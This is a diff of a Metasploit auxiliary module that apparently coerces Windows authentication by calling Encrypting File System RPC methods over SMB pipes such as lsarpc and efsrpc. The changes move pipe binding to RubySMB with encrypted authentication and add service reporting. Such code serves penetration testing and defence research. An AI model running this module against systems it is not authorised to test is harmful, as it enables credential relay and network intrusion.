@@ -6,36 +6,41 @@
 require 'windows_error'
 require 'ruby_smb'
 require 'ruby_smb/error'
+require 'ruby_smb/dcerpc/lsarpc'
 require 'ruby_smb/dcerpc/encrypting_file_system'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB::Client::Authenticated
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
 
   EncryptingFileSystem = RubySMB::Dcerpc::EncryptingFileSystem
 
   METHODS = %w[EfsRpcOpenFileRaw EfsRpcEncryptFileSrv EfsRpcDecryptFileSrv EfsRpcQueryUsersOnFile EfsRpcQueryRecoveryAgents].freeze
+  ### UPDATE ME
+  # The LSARPC UUID should be used for all pipe handles, except for the efsrpc one. For that one use
+  # EncryptingFileSystem and it's normal UUID
   PIPE_HANDLES = {
     lsarpc: {
-      uuid: EncryptingFileSystem::LSARPC_UUID,
-      opts: ['\\lsarpc'.freeze]
+      endpoint: RubySMB::Dcerpc::Lsarpc,
+      filename: 'lsarpc'.freeze
     },
     efsrpc: {
-      uuid: EncryptingFileSystem::EFSRPC_UUID,
-      opts: ['\\efsrpc'.freeze]
+      endpoint: RubySMB::Dcerpc::EncryptingFileSystem,
+      filename: 'efsrpc'.freeze
     },
     samr: {
-      uuid: EncryptingFileSystem::LSARPC_UUID,
-      opts: ['\\samr'.freeze]
+      endpoint: RubySMB::Dcerpc::Lsarpc,
+      filename: 'samr'.freeze
     },
     lsass: {
-      uuid: EncryptingFileSystem::LSARPC_UUID,
-      opts: ['\\lsass'.freeze]
+      endpoint: RubySMB::Dcerpc::Lsarpc,
+      filename: 'lsass'.freeze
     },
     netlogon: {
-      uuid: EncryptingFileSystem::LSARPC_UUID,
-      opts: ['\\netlogon'.freeze]
+      endpoint: RubySMB::Dcerpc::Lsarpc,
+      filename: 'netlogon'.freeze
     }
   }.freeze
 
@@ -78,19 +83,32 @@ class MetasploitModule < Msf::Auxiliary
     rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
       fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
     end
+    report_service(service_data)
+
+    begin
+      tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
+    rescue RubySMB::Error::RubySMBError => e
+      raise StandardError, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e})."
+    end
 
     handle_args = PIPE_HANDLES[datastore['PIPE'].to_sym]
     fail_with(Failure::BadConfig, "Invalid pipe: #{datastore['PIPE']}") unless handle_args
 
-    @handle = dcerpc_handle(
-      handle_args[:uuid],
+    # rename tree_file
+    @pipe = tree.open_file(filename: handle_args[:filename], write: true, read: true)
+    handle = dcerpc_handle(
+      handle_args[:endpoint]::UUID,
       handle_args.fetch(:version, '1.0'),
       handle_args.fetch(:protocol, 'ncacn_np'),
-      handle_args[:opts]
+      ["\\#{handle_args[:filename]}"]
     )
-    vprint_status("Binding to #{@handle} ...")
-    dcerpc_bind(@handle)
-    vprint_status("Bound to #{@handle} ...")
+    vprint_status("Binding to #{handle} ...")
+    @pipe.bind(
+      endpoint: handle_args[:endpoint],
+      auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+      auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
+    )
+    vprint_status("Bound to #{handle} ...")
 
     if datastore['METHOD'] == 'Automatic'
       methods = METHODS
@@ -107,8 +125,14 @@ class MetasploitModule < Msf::Auxiliary
       if response.nil?
         unless method == methods.last
           # rebind if we got a DCERPC error (as indicated by no response) and there are more methods to try
-          vprint_status("Rebinding to #{@handle} ...")
-          dcerpc_bind(@handle)
+          vprint_status("Rebinding to #{handle} ...")
+          @pipe.close
+          @pipe = tree.open_file(filename: handle_args[:filename], write: true, read: true)
+          @pipe.bind(
+            endpoint: handle_args[:endpoint],
+            auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+            auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
+          )
         end
 
         next
@@ -133,12 +157,27 @@ class MetasploitModule < Msf::Auxiliary
     request = EncryptingFileSystem.const_get("#{name}Request").new(**kwargs)
 
     begin
-      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
+      raw_response = @pipe.dcerpc_request(
+        request,
+        auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+        auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
+      )
     rescue Rex::Proto::DCERPC::Exceptions::Fault => e
       print_error "The #{name} Encrypting File System RPC request failed (#{e.message})."
       return nil
     end
 
     EncryptingFileSystem.const_get("#{name}Response").read(raw_response)
+  end
+
+  def service_data
+    {
+      host: rhost,
+      port: rport,
+      host_name: simple.client.default_name,
+      proto: 'tcp',
+      name: 'smb',
+      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
+    }
   end
 end
